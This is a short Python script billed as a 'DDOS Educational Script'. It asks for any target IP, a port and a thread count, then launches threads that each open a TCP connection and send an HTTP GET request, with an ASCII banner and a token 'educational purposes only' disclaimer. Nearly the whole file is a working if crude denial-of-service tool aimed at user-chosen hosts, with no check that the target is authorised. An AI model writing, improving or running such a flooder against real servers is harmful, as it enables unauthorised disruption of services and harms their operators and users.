import socket
import threading
import os
import re

#this code is fucked so to whoever wanna tinker with it just give up  

def display_banner():
    banner = r"""

    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
    ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░ 
    """
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear the terminal screen
    print(banner)

def validate_ip(ip):
    """Validate the format of an IP address."""
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None and all(0 <= int(octet) <= 255 for octet in ip.split('.'))

def ddos(target_ip, target_port, thread_id):
    """
    Simulates sending repeated requests to a target server.
    Only for educational purposes in a controlled environment.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Set a timeout for the connection
        sock.connect((target_ip, target_port))

        request = f"GET / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n"
        sock.send(request.encode())
        print(f"[Thread {thread_id}] Request sent to {target_ip}:{target_port}")

        sock.close()
    except socket.error as e:
        print(f"[Thread {thread_id}] Error: {e}")

def run_ddos(target, port, num_threads):
    """
    Launch multiple threads to simulate concurrent requests.
    """
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target, port, i + 1))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    display_banner()
    print("Welcome to the DDOS Educational Script")
    print("This script is for educational purposes only and should be used responsibly.")

    target = input("Enter the IP address of the target (e.g., 192.168.1.1): ")
    if not validate_ip(target):
        print("Invalid IP address format. Exiting.")
        return

    try:
        port = int(input("Enter the port number of the target (e.g., 80): "))
        if not (1 <= port <= 65535):
            raise ValueError("Port number must be between 1 and 65535.")
    except ValueError as e:
        print(f"Invalid port: {e}")
        return

    try:
        num_threads = int(input("Enter the number of threads: "))
        if num_threads < 1:
            raise ValueError("Number of threads must be at least 1.")
    except ValueError as e:
        print(f"Invalid input: {e}")
        return

    print(f"Starting DDoS simulation with {num_threads} threads on {target}:{port}...")
    run_ddos(target, port, num_threads)

if __name__ == "__main__":
    main()
